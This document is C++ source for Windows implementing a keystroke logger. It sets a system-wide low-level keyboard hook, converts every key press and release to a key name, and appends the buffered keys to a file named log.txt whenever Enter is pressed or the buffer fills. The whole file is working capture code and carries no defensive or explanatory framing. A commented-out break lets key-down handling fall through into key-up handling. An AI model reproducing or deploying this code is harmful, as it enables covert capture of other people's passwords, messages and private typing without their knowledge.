#include "keyboard.hpp"

#include <Windows.h>
#include <fstream>
#include <sstream>
#include <codecvt>
#include <locale>

#include "app/application.hpp"

static const size_t ms_max_buffer_symbol_count = 80;
static const char*  ms_file_name = "log.txt";

std::unique_ptr<Localization>  Keyboard::m_l10n;
std::queue<WString>            Keyboard::m_buffer;
std::wofstream                 Keyboard::m_file;

Keyboard::Keyboard()
{
    std::locale::global(std::locale(""));
    m_l10n.reset(new Localization);
}

Keyboard::~Keyboard()
{
    if (m_file.is_open())
        m_file.close();
    m_l10n.reset();
}

void Keyboard::run()
{
    MSG msg;
    ZeroMemory(&msg, sizeof(msg));

    const HWND active = GetActiveWindow();
    const HWND current_window = active;

    HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, Keyboard::processingKeyboard, GetModuleHandle(NULL), 0);
    if (hook)
    {
        while (WaitMessage())
        {
            MSG msg = { 0 };
            while (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE))
            {
                TranslateMessage(&msg);
                DispatchMessage(&msg);
            }
        }
    }
}

LRESULT CALLBACK Keyboard::processingKeyboard(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode == HC_ACTION)
    {
        LPKBDLLHOOKSTRUCT hock_struct = reinterpret_cast<LPKBDLLHOOKSTRUCT>(lParam);

        const DWORD vk = ((LPKBDLLHOOKSTRUCT)lParam)->vkCode;
        const char symbol = (char)vk;

        switch (wParam)
        {
        case WM_KEYDOWN:
        {
            const WString key = m_l10n->convertKeycodeToKeynameForKeydownSituation(vk);
            addNewKeyToBuffer(key);
        }//break;
        case WM_KEYUP:
        {
            const WString key = m_l10n->convertKeycodeToKeynameForKeyupSituation(vk);
            addNewKeyToBuffer(key);
        }break;
        default:
            break;
        }
        saveLogic(symbol);
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

void Keyboard::saveLogic(const DWORD& _symbol)
{
    const Bool is_return = m_l10n->isReturn(_symbol);
    const Bool buffer_is_full = m_buffer.size() > ms_max_buffer_symbol_count;

    if ( is_return || buffer_is_full )
    {
        saveBufferToFile();
    }
}

void Keyboard::saveBufferToFile()
{
    m_file.open(ms_file_name, std::ios::app);
    while (!m_buffer.empty())
    {
        const WString key = m_buffer.front();
        sendStringToFile(key);
        m_buffer.pop();
    }
    m_file.close();
}

void Keyboard::addNewKeyToBuffer(const WString& _key)
{
    if (_key.size())
        m_buffer.push(_key);
}

void Keyboard::sendStringToFile(const WString& _string)
{
    m_file << _string.c_str();
    std::wcout << _string.c_str(); // TODO delete
}
